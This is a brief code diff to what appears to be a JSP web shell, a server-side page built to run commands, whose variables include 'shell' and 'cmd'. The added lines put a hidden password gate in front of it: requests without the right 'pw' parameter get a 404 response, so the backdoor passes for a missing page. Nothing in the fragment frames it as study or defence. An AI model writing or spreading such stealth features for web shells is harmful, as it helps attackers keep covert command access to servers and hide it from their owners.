@@ -5,6 +5,11 @@
     }
 %>
 <%
+    String stealthPassword = "";
+    if(!stealthPassword.equals("") && !stealthPassword.equals(request.getParameter("pw"))) {
+        response.setStatus(404);
+        return;
+    }
     String shell = null;
     String shellOpt = null;
     String cmd = null;
